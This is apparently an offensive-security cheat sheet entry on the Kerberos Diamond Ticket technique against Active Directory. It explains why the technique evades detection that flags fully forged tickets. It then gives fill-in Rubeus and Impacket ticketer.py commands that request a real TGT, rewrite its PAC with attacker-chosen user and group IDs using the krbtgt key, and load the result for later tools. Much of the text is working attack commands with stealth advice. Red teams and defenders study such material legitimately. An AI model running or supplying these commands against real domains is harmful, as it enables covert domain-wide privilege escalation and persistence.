---
technique: DiamondTicket
category: kerberos-forged-tickets
targets: Domain (all services)
protocols: Kerberos
remote_capable: true
tags: kerberos diamond-ticket tgt forged-pac ad stealth persistence
---

# Diamond Ticket

Golden and silver tickets generate no prior KDC requests, making them detectable by tools that flag service ticket requests lacking a corresponding TGT request. Diamond tickets avoid this by requesting a legitimate ticket first, decrypting the PAC, modifying it with arbitrary group memberships, recalculating the signatures, and re-encrypting it. The result follows a normal request pattern and is harder to detect than a fully forged ticket. The krbtgt key (for a TGT) or service account key (for a service ticket) is still required. The Impacket implementation as of late 2022 fully replaces the PAC rather than patching it in-place; prefer the sapphire ticket approach for the most legitimate-looking output.

## Windows

Rubeus diamond performs the request-modify-reencrypt cycle in one command from a Windows machine.

### Rubeus diamond

#powershell #rubeus #tgt

Request a real TGT, modify its PAC to include attacker-chosen groups, and inject the result.

```powershell title:"Forge diamond ticket via Rubeus"
.\Rubeus.exe diamond /domain:$domain /user:$user /password:$pass /dc:$dc_fqdn /enctype:AES256 /krbkey:$krbtgt_aes256 /ticketuser:$impersonate_user /ticketuserid:$user_rid /groups:$group_ids
```
<!-- cheat
import users
import passwords
var domain
var dc_fqdn
var krbtgt_aes256
var impersonate_user
var user_rid
var group_ids
-->

## Linux

Impacket ticketer with `-request` fetches a real ticket and replaces its PAC; use the sapphire variant for a more authentic PAC.

### ticketer (diamond)

#python #impacket #tgt

Request a legitimate ticket, replace its PAC with a forged one containing attacker-chosen user and group IDs, and save the result.

```sh title:"Forge diamond ticket via Impacket ticketer"
ticketer.py -request -domain "$domain" -user "$user" -password "$pass" -nthash "$krbtgt_nt_hash" -aesKey "$krbtgt_aes256" -domain-sid "$domain_sid" -user-id "$user_rid" -groups "$group_ids" "$impersonate_user"
```
<!-- cheat
import domain_ip
import users
import passwords
var domain
var krbtgt_nt_hash
var krbtgt_aes256
var domain_sid
var user_rid
var group_ids
var impersonate_user
-->

### export KRB5CCNAME (ticketer)

#shell #env

Set KRB5CCNAME to the ccache written by ticketer.py so subsequent Kerberos tools use the diamond ticket.

```sh title:"Load ticketer.py ccache into KRB5CCNAME"
export KRB5CCNAME="$impersonate_user.ccache"
```
<!-- cheat
var impersonate_user
-->
